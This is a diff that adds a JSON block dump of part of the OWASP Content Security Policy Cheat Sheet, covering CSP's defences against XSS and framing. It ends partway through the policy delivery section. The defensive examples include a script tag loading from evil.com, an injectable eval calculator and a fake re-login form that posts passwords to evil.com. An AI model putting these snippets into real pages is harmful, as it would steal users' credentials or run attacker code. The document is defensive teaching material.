@@ -1,0 +1,3775 @@
+[
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00000",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 0,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "# Content Security Policy Cheat Sheet",
+    "text_hash": "75aed4c47191d9551a38b259c4a86efa8a184bebc8badf008315f4cf44770097",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 1,
+      "end_line": 1
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet"
+    ],
+    "heading_level": 1,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00001",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 1,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "## Introduction",
+    "text_hash": "d753efbab681fa4da82470d9a83b1c202de58f92fd498e77a269c1163bc4714b",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 3,
+      "end_line": 3
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Introduction"
+    ],
+    "heading_level": 2,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00002",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 2,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "This article brings forth a way to integrate the __defense in depth__ concept to the client-side of web applications. By injecting the Content-Security-Policy (CSP) headers from the server, the browser is aware and capable of protecting the user from dynamic calls that will load content into the page currently being visited.",
+    "text_hash": "93f74f680edd3ab5226e1a3e385921654af4c518e770b3218fb89317ebb92dea",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 5,
+      "end_line": 5
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Introduction"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00003",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 3,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "## Context",
+    "text_hash": "37861e2e14013ad7c69dfa0ecab17370a0a0e6cf9631382cdc23dff2fa1ba904",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 7,
+      "end_line": 7
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context"
+    ],
+    "heading_level": 2,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00004",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 4,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "The increase in XSS (Cross-Site Scripting), clickjacking, and cross-site leak vulnerabilities demands a more __defense in depth__ security approach.",
+    "text_hash": "e9dc09b5b60118012e1107924e4890fdfd3ce7c2672fe5950440ca1521d6f82a",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 9,
+      "end_line": 9
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00005",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 5,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Defense against XSS",
+    "text_hash": "b0789dd538848c39dc549153257b4067ed4d3d2c56537319c5284fc2931469c8",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 11,
+      "end_line": 11
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00006",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 6,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "CSP defends against XSS attacks in the following ways:",
+    "text_hash": "03daba788696f6f7ed929240a6382675db7f458571b25ad9eed5e6fdf646a24a",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 13,
+      "end_line": 13
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00007",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 7,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "#### 1. Restricting Inline Scripts",
+    "text_hash": "80ce5ad9dd5dbc5dd79b9fe20dfcbb45f8c4ce9abd1566365f40a4d739aca4da",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 15,
+      "end_line": 15
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS",
+      "1. Restricting Inline Scripts"
+    ],
+    "heading_level": 4,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00008",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 8,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "By preventing the page from executing inline scripts, attacks like injecting",
+    "text_hash": "f576e6fbef2a5ba196cd708e8298cd91d68feabae949fca0ee1befd9ada913f6",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 17,
+      "end_line": 17
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS",
+      "1. Restricting Inline Scripts"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00009",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 9,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```html\n<script>document.body.innerHTML='defaced'</script>\n```",
+    "text_hash": "d1b6465e47884db6781e8f45df472b1a5b9851710ada933cbd3003cb3ea4f17c",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 19,
+      "end_line": 21
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS",
+      "1. Restricting Inline Scripts"
+    ],
+    "heading_level": null,
+    "code_language": "html",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00010",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 10,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": " will not work.",
+    "text_hash": "e8889fa5c14114ea13cfeef1dcfaa8e5edce79f027fa6f920a4d8210fe551361",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 23,
+      "end_line": 23
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS",
+      "1. Restricting Inline Scripts"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00011",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 11,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "#### 2. Restricting Remote Scripts",
+    "text_hash": "ea41be636cac4f8974e347c93e45e9e45f83db6f138dc0deee486f924b8986ec",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 25,
+      "end_line": 25
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS",
+      "2. Restricting Remote Scripts"
+    ],
+    "heading_level": 4,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00012",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 12,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "By preventing the page from loading scripts from arbitrary servers, attacks like injecting",
+    "text_hash": "400c9b109415f9cfc3dac9e31f937db99ca95e32e7b059e8b4f2218c2c4b6efe",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 27,
+      "end_line": 27
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS",
+      "2. Restricting Remote Scripts"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00013",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 13,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```html\n<script src=\"https://evil.com/hacked.js\"></script>\n```",
+    "text_hash": "d639be4a8048d01cee63fee4a433537ab0956e6e20e3d0ca0c0df9e4646b744c",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 29,
+      "end_line": 31
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS",
+      "2. Restricting Remote Scripts"
+    ],
+    "heading_level": null,
+    "code_language": "html",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00014",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 14,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "will not work.",
+    "text_hash": "5aed58d10e72c91db0b0e227a925ca48a78eedf5fa5eb8c396e5828cc2459068",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 33,
+      "end_line": 33
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS",
+      "2. Restricting Remote Scripts"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00015",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 15,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "#### 3. Restricting Unsafe JavaScript",
+    "text_hash": "28c3d61d9de2c20d7b6f854f4b70cee6eeb8610ce6e0a510d997d8090f8faa20",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 35,
+      "end_line": 35
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS",
+      "3. Restricting Unsafe JavaScript"
+    ],
+    "heading_level": 4,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00016",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 16,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "By preventing the page from executing text-to-JavaScript functions like `eval`, the website will be safe from vulnerabilities like the this:",
+    "text_hash": "88ffe1bb100ef806e112e7f915fb5019e626c2066978afa26ab560a238caea2b",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 37,
+      "end_line": 37
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS",
+      "3. Restricting Unsafe JavaScript"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00017",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 17,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```js\n// A Simple Calculator\nvar op1 = getUrlParameter(\"op1\");\nvar op2 = getUrlParameter(\"op2\");\nvar sum = eval(`${op1} + ${op2}`);\nconsole.log(`The sum is: ${sum}`);\n```",
+    "text_hash": "24ccb6d82385819a2847729b2492cae8e9214e2ac9085dcc672a54d5e1417887",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 39,
+      "end_line": 45
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS",
+      "3. Restricting Unsafe JavaScript"
+    ],
+    "heading_level": null,
+    "code_language": "js",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00018",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 18,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "#### 4. Restricting Form submissions",
+    "text_hash": "8ffd8a3f3051a4be8746b668d884e011b919c460863d3204d8630c8f1e615e9b",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 47,
+      "end_line": 47
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS",
+      "4. Restricting Form submissions"
+    ],
+    "heading_level": 4,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00019",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 19,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "By restricting where HTML forms on your website can submit their data, injecting phishing forms won't work either.",
+    "text_hash": "4600cbfa0cf1f767e2e0922713577c37a17fc02c005169c577c40ffc02731fee",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 49,
+      "end_line": 49
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS",
+      "4. Restricting Form submissions"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00020",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 20,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```html\n<form method=\"POST\" action=\"https://evil.com/collect\">\n<h3>Session expired! Please login again.</h3>\n<label>Username</label>\n<input type=\"text\" name=\"username\"/>\n\n<label>Password</label>\n<input type=\"password\" name=\"pass\"/>\n\n<input type=\"Submit\" value=\"Login\"/>\n</form>\n```",
+    "text_hash": "b3ee107ccd51c915bcb76bbf8df5b2823bebcda7e4a004e78c9488600b522488",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 51,
+      "end_line": 62
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS",
+      "4. Restricting Form submissions"
+    ],
+    "heading_level": null,
+    "code_language": "html",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00021",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 21,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "#### 5. Restricting Objects",
+    "text_hash": "8e1e7680e0b697d4899c10c444fb7d7c1051ada85bcc71ef7e012af2620a36af",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 64,
+      "end_line": 64
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS",
+      "5. Restricting Objects"
+    ],
+    "heading_level": 4,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00022",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 22,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "And by restricting the HTML [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) tag, it also won't be possible for an attacker to inject malicious flash/Java/other legacy executables on the page.",
+    "text_hash": "01574cc8bfdcae6c8d20ce7f791313fe5107986e176d55cfcd17169bb24b71ce",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 66,
+      "end_line": 66
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against XSS",
+      "5. Restricting Objects"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00023",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 23,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Defense against framing attacks",
+    "text_hash": "4a3f9f620f531d21a7706ff58d87364cde889a0b5119d034aad76b2532d7395f",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 68,
+      "end_line": 68
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against framing attacks"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00024",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 24,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Attacks like clickjacking and some variants of browser side-channel attacks (xs-leaks) require a malicious website to load the target website in a frame.",
+    "text_hash": "292d48915e73820fbda59d5bbfec3520163badd2f004a836a9fe8e99055373ac",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 70,
+      "end_line": 70
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against framing attacks"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00025",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 25,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Historically the `X-Frame-Options` header has been used for this, but it has been obsoleted by the `frame-ancestors` CSP directive.",
+    "text_hash": "236f5cc60f8ae5962ae7e92443fd3449678b3daf25421d8bcd6f118baaa0f1f7",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 72,
+      "end_line": 72
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense against framing attacks"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00026",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 26,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Defense in Depth",
+    "text_hash": "4d97f60d6a84e645eb791a5185165e2edd5e879416eb2e2d350985ba0b3234dd",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 74,
+      "end_line": 74
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense in Depth"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00027",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 27,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "A strong CSP provides an effective __second layer__ of protection against various types of vulnerabilities, especially XSS. Although CSP doesn't prevent web applications from *containing* vulnerabilities, it can make those vulnerabilities significantly more difficult for an attacker to exploit.",
+    "text_hash": "f0efbf603de835a540f820801a65a3634334bc614d7e74a2870805ebbc632302",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 76,
+      "end_line": 76
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense in Depth"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00028",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 28,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Even on a fully static website, which does not accept any user input, a CSP can be used to enforce the use of [Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity). This can help prevent malicious code from being loaded on the website if one of the third-party sites hosting JavaScript files (such as analytics scripts) is compromised.",
+    "text_hash": "6a09bc7f727dd8d0b9eb400dfe0c101f403966af668358d2aca7c41aed9480d0",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 78,
+      "end_line": 78
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense in Depth"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00029",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 29,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "With all that being said, CSP __should not__ be relied upon as the only defensive mechanism against XSS. You must still follow good development practices such as the ones described in [Cross-Site Scripting Prevention Cheat Sheet](Cross_Site_Scripting_Prevention_Cheat_Sheet.md), and then deploy CSP on top of that as a bonus security layer.",
+    "text_hash": "9465cafd4fcb8d23747a022b99cd103d28156585364006277f113bba91477f2a",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 80,
+      "end_line": 80
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Context",
+      "Defense in Depth"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00030",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 30,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "## Policy Delivery",
+    "text_hash": "e45a49ac1da02b655cc150f723a4dfc62fd2dc4cb773ecaa4b844ed5a136cf32",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 82,
+      "end_line": 82
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery"
+    ],
+    "heading_level": 2,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00031",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 31,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "You can deliver a Content Security Policy to your website in three ways.",
+    "text_hash": "cea200a79ebb8a7b44e19f5688f794150653e2c3a919e74552061277fdbf9df6",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 84,
+      "end_line": 84
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00032",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 32,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### 1. Content-Security-Policy Header",
+    "text_hash": "e487df77d589167bcb3611b7a51ff99ec200ea8fde0b4301d8df23083f75fa45",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 86,
+      "end_line": 86
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "1. Content-Security-Policy Header"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00033",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 33,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Send a Content-Security-Policy HTTP response header from your web server.",
+    "text_hash": "d8e74a3401bab42b24879563e934b75009595cf57151c8c89dbdcfeacb6e2031",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 88,
+      "end_line": 88
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
